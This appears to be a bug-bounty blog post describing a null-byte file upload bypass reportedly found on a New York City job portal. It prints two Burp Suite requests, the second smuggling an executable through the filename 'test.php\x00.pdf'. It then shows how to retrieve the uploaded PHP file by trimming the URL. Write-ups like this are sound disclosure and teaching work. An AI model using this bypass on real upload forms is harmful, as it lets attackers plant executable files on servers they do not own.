---
layout: post
title: "Null-Byte File Upload Bypass: PoC on a NYC Portal"
date: 2025-08-29
categories: [bug-bounty]
image: https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dIWSWrtC08kIaoVTLITp5w.jpeg
permalink: /blog/NYC-DOWN-FUV
locked: false
---

While searching for jobs on a New York City job portal, I decided to create an account and explore the platform’s features. One of the first things I did was update my profile and upload my resume, just like any typical job seeker would. The profile page looked something like this:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*LfMseQB6u9eC7ER5irMVAA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>


As I interacted with the site, I started to notice some interesting behaviors in the file upload functionality. The platform only allowed certain file types specifically PDF and TXT files. Any attempt to upload other or potentially malicious files was blocked.

When uploading a file, you would see a request similar to this:

<div class="code-block-container">
  <span class="code-lang-tag">burp suite request</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
POST /upload HTTP/1.1
Host: localhost:5000
Content-Length: 49871
Cache-Control: max-age=0
Origin: http://localhost:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvqrfq0aFgpBXXzTT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:5000/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aLHqhg.2zjRjDid41OHk7Nrgl1dXJZ8n70
Connection: keep-alive

------WebKitFormBoundaryvqrfq0aFgpBXXzTT
Content-Disposition: form-data; name="file"; filename="rest.pdf"
Content-Type: application/pdf

%PDF-1.3
%Äåòåë§ó ÐÄÆ
4 0 obj
<< /Length 5 0 R /Filter /FlateDecode >>
stream.....
</code></pre>
</div>

However, if we modify the upload request and change the filename to include a null byte (for example, `test.php\x00.pdf`) and set the `Content-Type` to something like `application/vnd.microsoft.portable-executable`, the server processes the file as `test.php\x00.pdf`. This could potentially allow us to bypass the file type restrictions.

Here’s how the modified request would look:

<div class="code-block-container">
  <span class="code-lang-tag">burp suite request (null byte bypass)</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
POST /upload HTTP/1.1
Host: localhost:5000
Content-Length: 49871
Cache-Control: max-age=0
Origin: http://localhost:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvqrfq0aFgpBXXzTT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:5000/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aLHqhg.2zjRjDid41OHk7Nrgl1dXJZ8n70
Connection: keep-alive

------WebKitFormBoundaryvqrfq0aFgpBXXzTT
Content-Disposition: form-data; name="file"; filename="test.php\x00.pdf"
Content-Type: application/vnd.microsoft.portable-executable

<--MZ binary content-->
------WebKitFormBoundaryvqrfq0aFgpBXXzTT--
</code></pre>
</div>

This trick can sometimes bypass weak file validation mechanisms, potentially allowing the upload of executable or malicious files.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4sE7RSkRelC-XNJeqqNgBg.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Now, when you try to access the uploaded file, the application returns a "Page Not Found" error, and the URL looks like this:

```
http://localhost:5000/file/filename.php/x00
```

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*yPJ1-vbmpXkK2wkQYowPtA.png"
  alt="Null byte file download demo"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

However, if you manually remove the `/x00` from the URL so it becomes:

```
http://localhost:5000/file/filename.php
```

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*FUQ2f6XnHFX7cxqhFNDRFg.png"
  alt="Null byte file download demo"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

you are able to download the uploaded PHP file directly.

Below is a demonstration of replicating this vulnerability on a test environment (not the NYC job portal), but the screenshots above are from the real site:

## Video Demonstration

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe 
    src="https://www.youtube.com/embed/p3waRC1e7jo" 
    frameborder="0" 
    allowfullscreen 
    style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

**Thank you for reading!** If you found this post helpful or interesting, stay tuned for more cybersecurity stories and insights. See you

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*83hlWRWOv-NhKdltd1awtg.png"
  alt="No Detection"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>